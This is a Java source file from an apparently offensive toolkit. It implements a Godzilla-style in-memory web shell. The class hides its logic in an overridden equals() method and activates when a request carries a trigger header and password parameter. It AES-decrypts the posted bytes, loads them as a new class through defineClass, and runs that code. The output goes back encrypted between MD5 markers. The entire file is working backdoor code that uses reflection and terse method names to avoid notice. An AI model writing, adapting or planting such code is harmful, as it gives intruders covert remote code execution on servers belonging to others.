package com.reajason.javaweb.memshell.shelltool.godzilla;

import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.Key;

/**
 * @author ReaJason
 */
public class Godzilla extends ClassLoader {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public Godzilla() {
    }

    public Godzilla(ClassLoader z) {
        super(z);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrapRequest(args[0]);
        Object response = unwrapResponse(args[1]);
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] data = base64Decode(parameter);
                data = this.x(data, false);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
                if (sessionPayload == null) {
                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", (new Godzilla(Thread.currentThread().getContextClassLoader())).Q(data));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) sessionPayload).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                    writer.write(md5.substring(0, 16));
                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    writer.write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder", true, Thread.currentThread().getContextClassLoader());
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
            Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
            Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
            Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
            Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");

            initMethod.invoke(c, m ? 1 : 2, constructor.newInstance(key.getBytes(), "AES"));
            Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
            return ((byte[]) doFinalMethod.invoke(c, s));
        } catch (Exception var4) {
            return null;
        }
    }

    public Object unwrapRequest(Object request) {
        Object internalRequest = request;
        while (true) {
            try {
                Object r = getFieldValue(request, "request");
                if (r == internalRequest) {
                    return r;
                } else {
                    internalRequest = r;
                }
            } catch (Exception e) {
                return internalRequest;
            }
        }
    }

    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}